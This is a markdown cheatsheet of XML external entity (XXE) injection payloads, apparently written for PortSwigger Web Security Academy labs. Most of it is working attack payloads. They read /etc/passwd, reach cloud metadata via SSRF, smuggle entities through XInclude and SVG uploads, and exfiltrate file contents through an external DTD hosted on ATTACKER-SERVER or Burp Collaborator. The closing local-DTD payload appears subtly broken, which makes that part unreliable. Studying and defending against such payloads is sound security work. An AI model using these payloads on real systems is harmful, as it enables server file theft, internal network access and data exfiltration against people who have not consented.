# 📄 XML External Entity (XXE) Injection Cheatsheet

Complete methodology, bypass techniques, and exploitation vectors for XXE Injection labs tested in PortSwigger Web Security Academy.

---

## 📌 Attack Vectors & Methodology

* Target Content-Types: `application/xml`, `text/xml`
* Key Entry Points:
  - XML Request Bodies
  - File Uploads (SVG, Office Documents)
  - Hidden XML Parsing (XInclude in standard parameters)

---

## 🛠️ Detailed Breakdown & Payloads

* **Exploiting XXE using external entities to retrieve files:**
  - Define an external entity referring to local files and reference it inside the XML body:
  - `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
  - Insert `&xxe;` into a displayed XML value.

* **Exploiting XXE to perform SSRF attacks:**
  - Define an external entity targeting internal backend services or cloud metadata:
  - `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>`

* **Exploiting XInclude to retrieve files:**
  - Inject XInclude syntax when you cannot edit the `<!DOCTYPE>` declaration directly:
  - `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

* **Exploiting XXE via image file upload (SVG):**
  - Upload a malicious SVG image containing an embedded XXE payload:
  - `<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><inline><![CDATA[...]]></inline><script>...</script><text x="0" y="20">&xxe;</text></svg>`
  - Define `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` inside the SVG.

* **Blind XXE with out-of-band interaction:**
  - Detect blind XXE by forcing the server to issue an out-of-band request to Burp Collaborator:
  - `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`

* **Blind XXE with out-of-band interaction via XML parameter entities:**
  - Bypass strict entity restrictions by using parameter entities (`%` syntax):
  - `<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

* **Exploiting blind XXE to exfiltrate data using a malicious external DTD:**
  - Host an external DTD script on an attacker server to exfiltrate data out-of-band via URL query parameters:
  - External DTD (`eval.dtd`):
    `<!ENTITY % file SYSTEM "file:///etc/passwd">`
    `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">`
    `%eval; %exfil;`
  - Inline Payload:
    `<!DOCTYPE test [<!ENTITY % stack SYSTEM "http://ATTACKER-SERVER/eval.dtd"> %stack;]>`

* **Exploiting blind XXE to retrieve data via error messages:**
  - Trigger a local file parse error via an invalid DTD file reference to print contents in the server response:
  - External DTD (`error.dtd`):
    `<!ENTITY % file SYSTEM "file:///etc/passwd">`
    `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
    `%eval; %error;`

* **Exploiting XXE to retrieve data by repurposing a local DTD:**
  - Redefine existing entities inside internal system DTDs (e.g., DocBook DTD on Linux) to trigger detailed error messages without out-of-band access:
  - `<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"> <!ENTITY % expr 'file:///nonexistent/%file;'> <!ENTITY % file SYSTEM "file:///etc/passwd"> %local_dtd; ]>`

---
